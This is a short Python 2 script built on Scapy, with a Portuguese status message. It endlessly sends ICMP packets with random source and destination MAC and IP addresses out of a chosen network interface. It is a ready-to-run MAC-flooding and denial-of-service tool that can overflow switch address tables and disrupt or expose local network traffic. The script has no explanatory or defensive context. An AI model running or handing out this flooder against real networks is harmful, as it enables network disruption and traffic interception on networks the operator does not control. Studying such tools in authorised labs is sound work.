#!/usr/bin/python

import sys
from scapy.all import *
packet = Ether(src=RandMAC("*:*:*:*:*:*"),
        dst=RandMAC("*:*:*:*:*:*")) / \
        IP(src=RandIP("*.*.*.*"),
        dst=RandIP("*.*.*.*")) / \
            ICMP()
if len(sys.argv) < 2:
    dev = "eth0"
else:
    dev = sys.argv[1]
print "Floodando com pacotes randomicos " + dev
sendp(packet, iface=dev, loop=1)
